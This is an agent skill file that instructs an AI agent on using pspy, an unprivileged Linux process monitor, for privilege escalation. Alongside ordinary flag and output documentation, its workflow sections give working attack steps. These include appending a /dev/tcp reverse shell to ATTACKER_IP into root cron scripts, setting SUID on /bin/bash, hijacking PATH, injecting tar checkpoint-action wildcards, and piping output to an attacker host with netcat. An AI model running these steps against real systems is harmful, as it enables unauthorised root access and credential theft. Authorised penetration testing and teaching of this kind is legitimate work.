---
name: pspy
description: >
  Operate and interpret pspy — an unprivileged Linux process monitor that snoops /proc and inotify
  without requiring root. Use when conducting privilege escalation assessments, hunting cron jobs,
  catching credential leakage in process arguments, monitoring file system events, or identifying
  writable scripts executed by higher-privileged processes. Covers binary selection, execution flags,
  output interpretation, cron job detection, PrivEsc workflows, and integration with post-exploitation
  frameworks.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/DominicBreuker/pspy
  stars: '5.3k'
  language: Go
---

# pspy Agent Skill

## When to Use This Skill

Use this skill when:
- You have a low-privilege shell and need to discover what processes are running as root
- Hunting for cron jobs or at-jobs that may execute writable scripts
- Suspecting credential leakage through command-line arguments (passwords passed as args)
- Monitoring file system events to understand privileged service behavior
- Building post-exploitation enumeration scripts that include process monitoring
- The user asks about unprivileged process monitoring on Linux

## What pspy Does

pspy polls `/proc` at a configurable interval to enumerate running processes without requiring elevated
privileges. It watches for new PIDs by scanning `/proc/*/status`, `/proc/*/cmdline`, and `/proc/*/stat`,
then optionally layers inotify watches over specified directories to catch filesystem events in real time.
Unlike `ps aux` called once, pspy runs continuously and catches short-lived processes — critical for
catching cron jobs that spawn and die in under a second.

## Binary Selection

Four pre-compiled binaries are released; pick based on target architecture and whether you want the
larger static binary (with inotify/filesystem support):

| Binary    | Arch   | Size    | inotify support |
|-----------|--------|---------|-----------------|
| pspy32    | x86    | ~2.5 MB | Yes             |
| pspy64    | x86_64 | ~3 MB   | Yes             |
| pspy32s   | x86    | ~1 MB   | No (stripped)   |
| pspy64s   | x86_64 | ~1.2 MB | No (stripped)   |

Use the `s` (small) variants when disk space or transfer bandwidth is constrained and you do not need
filesystem event monitoring. The `s` binaries have inotify/directory watching compiled out.

## Installation

### Method 1 — Download release binary (recommended for engagements)

```bash
# On attacker machine — grab latest release
VERSION=$(curl -s https://api.github.com/repos/DominicBreuker/pspy/releases/latest \
  | grep tag_name | cut -d '"' -f4)
wget "https://github.com/DominicBreuker/pspy/releases/download/${VERSION}/pspy64"
chmod +x pspy64

# Transfer to target (various methods)
# Python HTTP server on attacker:
python3 -m http.server 8080

# On target:
wget http://ATTACKER_IP:8080/pspy64 -O /tmp/pspy64
curl -s http://ATTACKER_IP:8080/pspy64 -o /tmp/pspy64
chmod +x /tmp/pspy64
```

### Method 2 — Build from source

```bash
git clone https://github.com/DominicBreuker/pspy.git
cd pspy
go build -ldflags "-s -w" -o pspy64 .
# Cross-compile for 32-bit target:
GOARCH=386 go build -ldflags "-s -w" -o pspy32 .
```

### Transfer via base64 (no wget/curl on target)

```bash
# Attacker — encode binary
base64 -w0 pspy64 > pspy64.b64
# Target — decode and make executable
base64 -d pspy64.b64 > /tmp/pspy64 && chmod +x /tmp/pspy64
```

## Core Concepts

### How pspy Monitors Processes

pspy spawns two goroutines:
1. **Proc scanner** — walks `/proc/[0-9]+/` at a configurable interval, reads `cmdline`, `status`,
   and `stat` to extract PID, PPID, UID, and full command line. Detects new or changed entries.
2. **inotify watcher** — registers inotify watches on specified directories (default: `/`, `/tmp`,
   `/etc`, `/home`, `/var`, `/opt`) and reports `IN_CREATE`, `IN_CLOSE_WRITE`, `IN_DELETE` events.

pspy does NOT require `ptrace`, `CAP_SYS_PTRACE`, or any special capability. It reads world-readable
`/proc` entries. Some `/proc` entries are root-only, so pspy cannot read environment variables of other
users' processes — only command-line arguments visible in `/proc/*/cmdline`.

### Output Fields

Each process event line has the format:

```
YYYY/MM/DD HH:MM:SS CMD   UID=<uid> PID=<pid> | <full command line>
```

- `UID=0` — process running as root; highest value to an attacker
- `UID=1000` — process running as a normal user (uid varies by system)
- `PID` — process ID; combine with `/proc/<PID>/` for further inspection
- `PPID` is shown in verbose mode (`-v`)
- The full command line includes all arguments — credentials often appear here

File system events have the format:

```
YYYY/MM/DD HH:MM:SS FS     >>> /path/to/file
```

Event types: `IN_CREATE`, `IN_CLOSE_WRITE`, `IN_MODIFY`, `IN_DELETE`, `IN_MOVED_FROM`, `IN_MOVED_TO`.

## CLI Reference

```bash
# Basic usage — monitor processes, default 100ms interval, watch common dirs
/tmp/pspy64

# Set proc scan interval to 1 second (less CPU, may miss very fast processes)
/tmp/pspy64 -i 1000

# Set proc scan interval to 50ms (more aggressive, catches faster processes)
/tmp/pspy64 -i 50

# Disable filesystem (inotify) events — process events only
/tmp/pspy64 -p

# Enable filesystem events only (no proc scan)
/tmp/pspy64 -f

# Watch specific directories for filesystem events
/tmp/pspy64 -r /etc -r /tmp -r /var/spool/cron

# Verbose output (show PPID, extra fields)
/tmp/pspy64 -v

# Disable color output (better for log files / piping)
/tmp/pspy64 --color=false

# Redirect output to a file for later analysis
/tmp/pspy64 -i 500 2>&1 | tee /tmp/pspy_output.txt

# Run for a fixed duration and exit (useful in scripts)
timeout 120 /tmp/pspy64 -i 500 2>&1 | tee /tmp/pspy_cron_watch.txt

# Watch /proc only, no filesystem, aggressive interval
/tmp/pspy64 -p -i 100
```

## Interpreting Output

### New Process Detection

pspy prints a line only when it first sees a PID. A re-used PID (kernel reuse after process death)
will appear as a new process. Watch for:

```
2026/04/04 22:00:01 CMD   UID=0    PID=12345  | /bin/sh -c /opt/backup/run_backup.sh
2026/04/04 22:00:01 CMD   UID=0    PID=12346  | /bin/bash /opt/backup/run_backup.sh
```

This shows cron (or another scheduler) spawning a root shell running a script.

### Credential Leakage Example

```
CMD   UID=1001 PID=9988  | mysql -u dbadmin -pS3cr3tP@ss -h 127.0.0.1 mydb
CMD   UID=0    PID=7123  | /usr/bin/python3 /opt/deploy.py --token eyJhbGc...
CMD   UID=0    PID=4501  | rsync -az -e 'ssh -i /root/.ssh/id_rsa' /data/ backup@10.10.10.5:/data/
```

Anything passed as a `-p`, `--password`, `--token`, `--key`, or similar flag is visible in
`/proc/*/cmdline` and therefore to pspy.

### Filesystem Event Example

```
FS     >>> /var/spool/cron/crontabs/root
FS     >>> /tmp/tmpXXXXXX
FS     >>> /etc/passwd
```

A write event to `/etc/passwd` from a UID=0 process indicates a password change; write events to
`/var/spool/cron/` indicate crontab modification.

## Cron Job Detection Workflow

Cron jobs are the primary PrivEsc vector pspy is used to find.

```bash
# Step 1 — Run pspy with aggressive interval for at least 2 minutes
# to catch minute-granularity cron jobs
timeout 180 /tmp/pspy64 -i 100 2>&1 | tee /tmp/cron_watch.txt

# Step 2 — Filter output for UID=0 jobs only
grep "UID=0" /tmp/cron_watch.txt

# Step 3 — Look for patterns like /bin/sh -c, cron, or periodic scripts
grep -E "UID=0.*(sh -c|cron|\.sh|python|perl|php)" /tmp/cron_watch.txt

# Step 4 — Identify the script being executed
# e.g., output shows: UID=0 PID=xxxx | /bin/bash /opt/scripts/cleanup.sh

# Step 5 — Check permissions on that script
ls -la /opt/scripts/cleanup.sh
# If world-writable: -rwxrwxrwx root root ...

# Step 6 — Inject reverse shell or SUID binary creation
echo 'chmod +s /bin/bash' >> /opt/scripts/cleanup.sh
# Wait for next cron execution, then:
/bin/bash -p   # Spawns bash with SUID privileges
```

## Privilege Escalation Workflow

### Pattern 1 — Writable Script Called by Root Cron

```bash
# Observed in pspy:
# UID=0 PID=xxxx | /bin/bash /var/lib/scripts/monitor.sh

ls -la /var/lib/scripts/monitor.sh
# Output: -rwxrwxr-x 1 root root ... monitor.sh  <-- group writable, and we're in that group

# Inject payload (reverse shell)
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /var/lib/scripts/monitor.sh

# On attacker:
nc -lvnp 4444
# Wait for cron to fire
```

### Pattern 2 — PATH Hijacking in Cron

```bash
# pspy output:
# UID=0 | /bin/sh -c cd /opt/app && python manage.py cleanup

# Check PATH set in crontab
cat /etc/crontab | grep PATH
# PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Check if any PATH component is writable
ls -la /usr/local/bin/
# If writable, create malicious 'python' binary there

cat > /usr/local/bin/python << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x /usr/local/bin/python
```

### Pattern 3 — Wildcard Injection via Filesystem Events

```bash
# pspy FS event shows:
# FS >>> /opt/backup/
# pspy CMD shows:
# UID=0 | tar -czf /backup/archive.tar.gz /opt/backup/*

# Exploit tar wildcard
cd /opt/backup
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=bash shell.sh"
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > shell.sh
```

## Advanced Techniques

### Grep Filtering During Live Run

```bash
# Watch only for new UID=0 processes
/tmp/pspy64 -i 100 | grep --line-buffered "UID=0"

# Watch for credential patterns in real time
/tmp/pspy64 -i 100 | grep --line-buffered -iE "(password|passwd|token|secret|key|auth)"

# Watch for script executions only
/tmp/pspy64 -i 100 | grep --line-buffered -E "\.(sh|py|pl|rb|php)"
```

### Combining pspy with LinPEAS

```bash
# Run both simultaneously — pspy monitors background while linpeas runs
/tmp/pspy64 -i 500 > /tmp/pspy.log 2>&1 &
PSPY_PID=$!
/tmp/linpeas.sh > /tmp/linpeas.log 2>&1
kill $PSPY_PID
```

### Automated Cron Script Extraction

```bash
# Extract all unique commands run as UID=0
grep "UID=0" /tmp/pspy_output.txt | awk -F'| ' '{print $2}' | sort -u

# Extract script paths for permission checking
grep "UID=0" /tmp/pspy_output.txt | grep -oE '/[a-zA-Z0-9/_.-]+\.(sh|py|pl|rb)' | sort -u | \
  xargs -I{} ls -la {}
```

## Integration with Other Tools

### With LinPEAS

LinPEAS checks cron files statically; pspy catches jobs that run from non-standard schedulers
(systemd timers, at, custom daemons). Run both.

### With Metasploit (post-exploitation)

```bash
# After getting a meterpreter shell
upload pspy64 /tmp/pspy64
shell
chmod +x /tmp/pspy64
/tmp/pspy64 -i 500 > /tmp/pspy.log &
# After waiting, download log
download /tmp/pspy.log
```

### With netcat / socat for output exfiltration

```bash
# On attacker — listen for pspy output
nc -lvnp 9001 > pspy_live.log

# On target — pipe pspy output directly to attacker
/tmp/pspy64 -i 250 | nc ATTACKER_IP 9001
```

## Troubleshooting

| Issue | Cause | Fix |
|-------|-------|-----|
| `exec format error` | Wrong binary arch | Use pspy32 on 32-bit; pspy64 on 64-bit |
| `permission denied` | Binary not executable | `chmod +x /tmp/pspy64` |
| No cron jobs seen | Waiting time too short | Run for at least 2–3 minutes |
| Output too noisy | Too many processes | Pipe through grep for UID=0 |
| Binary too large | Disk space constrained | Use pspy64s (stripped, ~1.2 MB) |
| inotify limit hit | System inotify limit | `echo 524288 > /proc/sys/fs/inotify/max_user_watches` (requires root) |
| No `/proc` access | Container with restricted /proc | pspy will fail; use manual polling via `cat /proc/*/cmdline` |
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
